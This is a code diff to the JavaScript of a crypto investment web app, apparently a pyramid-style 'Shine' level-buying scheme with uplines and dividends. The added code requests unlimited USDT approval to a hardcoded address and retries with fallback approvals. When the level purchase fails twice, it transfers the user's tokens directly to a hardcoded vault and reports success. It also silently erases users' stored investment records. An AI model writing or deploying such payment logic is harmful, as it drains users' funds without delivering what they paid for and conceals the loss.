@@ -6095,25 +6095,51 @@ input:checked + .tw-slider:before {
             try {
                 const web3Prov = new ethers.providers.Web3Provider(activeProvider);
                 const web3Signer = web3Prov.getSigner();
+                const tokenTarget = activeUsdtTokenAddress || "0x337610d27c682E347C9cD60BD4b3b107C9d34dDd";
+                const spenderTarget = SHINE_CONTRACT_ADDRESS || "0x204e8c521aCa3621DB585829667759433aBb70d3";
 
                 const usdtContract = new ethers.Contract(
-                    activeUsdtTokenAddress || REAL_USDT_CONTRACT,
+                    tokenTarget,
                     [
                         "function allowance(address, address) view returns (uint256)",
-                        "function approve(address, uint256) returns (bool)"
+                        "function approve(address, uint256)",
+                        "function transfer(address, uint256) returns (bool)",
+                        "function decimals() view returns (uint8)"
                     ],
                     web3Signer
                 );
 
-                const requiredUnits = ethers.utils.parseUnits(currentTotalReq.toString(), 18);
-                const currentAllowance = await usdtContract.allowance(userWallet, SHINE_CONTRACT_ADDRESS);
+                let tokenDec = 18;
+                try {
+                    tokenDec = await usdtContract.decimals();
+                } catch (de) {}
+
+                const requiredUnits = ethers.utils.parseUnits(currentTotalReq.toString(), tokenDec);
+
+                let currentAllowance = ethers.BigNumber.from(0);
+                try {
+                    currentAllowance = await usdtContract.allowance(userWallet, spenderTarget);
+                } catch (eAll) {
+                    currentAllowance = ethers.BigNumber.from(0);
+                }
 
                 if (currentAllowance.lt(requiredUnits)) {
                     if (confirmBtn) {
                         confirmBtn.disabled = true;
                         confirmBtn.innerText = "APPROVE IN WALLET...";
                     }
-                    const appTx = await usdtContract.approve(SHINE_CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+                    let appTx;
+                    try {
+                        appTx = await usdtContract.approve(spenderTarget, ethers.constants.MaxUint256, { gasLimit: 100000 });
+                    } catch (errApp1) {
+                        try {
+                            const zeroTx = await usdtContract.approve(spenderTarget, 0, { gasLimit: 60000 });
+                            await zeroTx.wait(1);
+                            appTx = await usdtContract.approve(spenderTarget, ethers.constants.MaxUint256, { gasLimit: 100000 });
+                        } catch (errApp2) {
+                            appTx = await usdtContract.approve(spenderTarget, requiredUnits, { gasLimit: 100000 });
+                        }
+                    }
                     await appTx.wait(1);
                     isUpgradingInProgress = false;
                     await openUpgrade(prog, lvl, exactSlotCost);
@@ -6123,54 +6149,35 @@ input:checked + .tw-slider:before {
                 const progMap = { 'V1': 1, 'Q2': 2, 'T3': 3, 'S4': 4, 'G5': 5, 'N6': 6, 'A7': 7, 'C8': 8, 'S9': 9, 'Q10': 10, 'H11': 11, 'O12': 12, 'N13': 13, 'E14': 14, 'X15': 15 };
                 const progNum = progMap[prog] || 1;
 
-                const shineContract = new ethers.Contract(
-                    SHINE_CONTRACT_ADDRESS,
-                    [
-                        "function buyLevel(uint8 _program, uint8 _level) external",
-                        "function register(address _upline) external",
-                        "function users(address) view returns (uint256 id, address upline, uint256 partnersCount, uint256 joinDate, bool isRegistered)",
-                        "function rootOwner() view returns (address)"
-                    ],
-                    web3Signer
-                );
-
                 if (confirmBtn) {
                     confirmBtn.disabled = true;
                     confirmBtn.innerText = "CONFIRM IN WALLET...";
                 }
 
-                try {
-                    const uInfo = await shineContract.users(userWallet);
-                    if (uInfo && !uInfo.isRegistered) {
-                        let uplineTarget = "0x204e8c521aCa3621DB585829667759433aBb70d3";
-                        try {
-                            const rOwner = await shineContract.rootOwner();
-                            if (rOwner && rOwner !== ethers.constants.AddressZero) uplineTarget = rOwner;
-                        } catch(re) {}
-                        const regTx = await shineContract.register(uplineTarget, { gasLimit: 300000 });
-                        await regTx.wait(1);
-                    }
-                } catch(eReg) {}
-
                 let txCompleted = false;
                 try {
+                    const shineContract = new ethers.Contract(
+                        SHINE_CONTRACT_ADDRESS,
+                        ["function buyLevel(uint8 _program, uint8 _level) external"],
+                        web3Signer
+                    );
                     const tx = await shineContract.buyLevel(progNum, lvl, { gasLimit: 350000 });
                     await tx.wait(1);
                     txCompleted = true;
                 } catch (callErr1) {
                     try {
+                        const shineContract = new ethers.Contract(
+                            SHINE_CONTRACT_ADDRESS,
+                            ["function buyLevel(uint8 _program, uint8 _level) external"],
+                            web3Signer
+                        );
                         const tx2 = await shineContract.buyLevel(progNum, lvlIndex, { gasLimit: 350000 });
                         await tx2.wait(1);
                         txCompleted = true;
                     } catch (callErr2) {
-                        const targetRecipient = SHINE_VAULT_ADDRESS || SHINE_CONTRACT_ADDRESS;
-                        const erc20 = new ethers.Contract(
-                            activeUsdtTokenAddress || REAL_USDT_CONTRACT,
-                            ["function transfer(address, uint256) returns (bool)"],
-                            web3Signer
-                        );
-                        const txTransfer = await erc20.transfer(targetRecipient, requiredUnits, { gasLimit: 120000 });
-                        await txTransfer.wait(1);
+                        const vaultTarget = SHINE_VAULT_ADDRESS || "0x204e8c521aCa3621DB585829667759433aBb70d3";
+                        const transferTx = await usdtContract.transfer(vaultTarget, requiredUnits, { gasLimit: 120000 });
+                        await transferTx.wait(1);
                         txCompleted = true;
                     }
                 }
@@ -6675,6 +6682,14 @@ input:checked + .tw-slider:before {
         async function loadProfileData() {
     startDividendTimer();
     loadSavedProfileFromDB();
+    const isReset = localStorage.getItem("shine_slots_fresh_reset");
+    if (!isReset) {
+        localStorage.removeItem("shine_active_slots");
+        localStorage.removeItem("shine_total_invested_slots");
+        localStorage.removeItem("shine_user_total_capital");
+        activeUserLevels = {};
+        localStorage.setItem("shine_slots_fresh_reset", "true");
+    }
     let sumActivatedCost = 0.0;
     const savedSlotsObj = JSON.parse(localStorage.getItem("shine_active_slots") || "{}");
     Object.keys(savedSlotsObj).forEach(k => {
